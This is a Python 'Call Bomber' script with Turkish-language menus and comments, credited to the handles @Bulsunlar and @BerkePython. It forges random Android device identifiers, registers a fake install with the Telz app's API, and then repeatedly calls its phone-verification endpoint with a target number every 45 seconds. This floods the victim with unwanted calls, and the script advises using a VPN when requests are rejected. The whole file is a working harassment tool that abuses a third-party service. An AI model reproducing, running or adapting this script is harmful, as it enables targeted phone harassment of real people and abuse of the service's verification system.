#<-------------⛧BERKESANAL⛧-------------------->
#~Cr ;  @Bulsunlar
#~Kanal ; @BerkePython
#<--------------⛧BERKESANAL⛧-------------------->
import time
import random
import string
import uuid
import json
import requests
import os
import sys
#H / B 
class Renk:
    ALTIN = '\033[38;5;220m'
    GUMUS = '\033[38;5;250m'
    PREMIUM = '\033[38;5;135m' 
    KRAL_MAVI = '\033[38;5;33m'
    ACIL_DURUM = '\033[38;5;196m'
    BASARI = '\033[38;5;82m'
    UYARI = '\033[38;5;214m'
    SIFIRLA = '\033[0m'
    KOYU_GRI = '\033[90m'
#Yapana Kadar kör Oldum Yaram
def ekranı_temizle():
    os.system("clear" if os.name == "posix" else "cls")
#yozgat Yaragi
def vip_banner():
    ekranı_temizle()
    banner = f"""╔═══════════════════════════════════════════════════╗
  ____  ______ _____  _  ________ 
 |  _ \|  ____|  __ \| |/ /  ____|
 | |_) | |__  | |__) | ' /| |__   
 |  _ <|  __| |  _  /|  < |  __|  
 | |_) | |____| | \ \| . \| |____ 
 |____/|______|_|  \_\_|\_\______|
                                  
                     @Bulsunlar ~ @BerkePython                     ╚═══════════════════════════════════════════════════╝

    
{Renk.KOYU_GRI}    ─────────────────────────────────────────────────────────────
{Renk.PREMIUM}    [+] BY : {Renk.ALTIN} @Bulsunlar
{Renk.PREMIUM}    [+] BİO      : {Renk.GUMUS}@BerkePython
{Renk.PREMIUM}    [+] STATUS       : {Renk.BASARI}ONLINE / ENCRYPTED
{Renk.KOYU_GRI}    ─────────────────────────────────────────────────────────────{Renk.SIFIRLA}
    """
    print(banner)
#Ne Diyon yaram
class CihazMotoru:
    @staticmethod
    def kimlik_olustur():
        return {
            "ts": round(time.time() * 1000),
            "aid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
            "uid": str(uuid.uuid4())
        }

class VIP_Gonderici:
    def __init__(self):
        self.headers = {
            "User-Agent": "Telz-Android/17.5.17",
            "Content-Type": "application/json",
            "Connection": "keep-alive"
        }

    def saki_protokol_baslat(self, numara):
        kimlik = CihazMotoru.kimlik_olustur()
        
        
        kurulum_url = "https://api.telz.com/app/install"
        payload_1 = {
            "android_id": kimlik["aid"],
            "app_version": "17.5.17",
            "event": "install",
            "os": "android",
            "ts": kimlik["ts"],
            "uuid": kimlik["uid"]
        }
        
        try:
            r1 = requests.post(kurulum_url, json=payload_1, headers=self.headers, timeout=10)
            if r1.status_code == 200:
                
                arama_url = "https://api.telz.com/app/auth_call"
                payload_2 = {
                    "android_id": kimlik["aid"],
                    "event": "auth_call",
                    "phone": f"+{numara}",
                    "ts": kimlik["ts"],
                    "uuid": kimlik["uid"]
                }
                r2 = requests.post(arama_url, json=payload_2, headers=self.headers, timeout=10)
                return r2.status_code == 200
        except:
            return False
        return False

def ana_menu():
    while True:
        vip_banner()
        print(f"{Renk.ALTIN}[1]{Renk.GUMUS} Call Bomber ")
        print(f"{Renk.ALTIN}[2]{Renk.GUMUS} GELİŞTİRİCİ BİLGİSİ")
        print(f"{Renk.ALTIN}[0]{Renk.ACIL_DURUM} SİSTEMDEN ÇIK")
        print(f"{Renk.KOYU_GRI}─────────────────────────────────────────────────────────────")
        
        secim = input(f"{Renk.PREMIUM}SECİNİZ >> {Renk.SIFIRLA}")

        if secim == "1":
            saldiri_ekrani()
        elif secim == "2":
            hakkinda()
        elif secim == "0":
            print(f"{Renk.UYARI}Bağlantı kesiliyor...")
            break

def hakkinda():
    vip_banner()
    print(f"{Renk.ALTIN}Dev:{Renk.SIFIRLA} @Bulsunlar")
    print(f"{Renk.ALTIN}Bio   :{Renk.SIFIRLA} @BerkePython")
    print(f"{Renk.ALTIN}Nedir   :{Renk.SIFIRLA} Call Bomber.")
    print(f"{Renk.ALTIN}Uyarı      :{Renk.ACIL_DURUM} Kötüye kullanım kullanıcı sorumluluğundadır.")
    input(f"\n{Renk.KOYU_GRI}Ana menü için ENTER'a basın...")

def saldiri_ekrani():
    vip_banner()
    print(f"{Renk.UYARI}Lütfen hedef numarayı girin (Örn: 905xxxxxxxxx)")
    hedef = input(f"{Renk.PREMIUM}HEDEF NUMARA >> {Renk.SIFIRLA}").replace("+", "").replace(" ", "")
    
    if not hedef.isdigit():
        print(f"{Renk.ACIL_DURUM}Hata: Geçersiz format!")
        time.sleep(2)
        return

    vip_banner()
    print(f"{Renk.BASARI}Saldırı Protokolü Aktif Edildi: {Renk.GUMUS}+{hedef}")
    print(f"{Renk.KOYU_GRI}Durdurmak için CTRL+C tuşlarına basın.\n")
    
    gonderici = VIP_Gonderici()
    tur = 1
    
    try:
        while True:
            print(f"{Renk.ALTIN}[ TUR {tur} ]{Renk.SIFIRLA} Saldırı paketleri gönderiliyor...")
            sonuc = gonderici.saki_protokol_baslat(hedef)
            
            if sonuc:
                print(f"{Renk.BASARI}[+] PAKET ENJEKTE EDİLDİ: Arama Gönderildi.")
            else:
                print(f"{Renk.ACIL_DURUM}[-] PAKET REDDEDİLDİ: VPN Kullanmayı Deneyin.")
            
            
            print(f"{Renk.KOYU_GRI}Yeni Arama için bekleniyor...")
            for i in range(45, 0, -1):
                sys.stdout.write(f"\r{Renk.KRAL_MAVI}[{i:02d}]{Renk.GUMUS} Saniye kaldı...")
                sys.stdout.flush()
                time.sleep(1)
            print("\n")
            tur += 1
    except KeyboardInterrupt:
        print(f"\n{Renk.UYARI}Saldırı BerkeSanal tarafından durduruldu.")
        time.sleep(2)

if __name__ == "__main__":
    try:
        ana_menu()
    except Exception as e:
        print(f"Kritik Hata: {e}")
#<-------------⛧BERKESANAL⛧-------------------->
#~Cr ;  @Bulsunlar
#~Kanal ; @BerkePython
#<--------------⛧BERKESANAL⛧-------------------->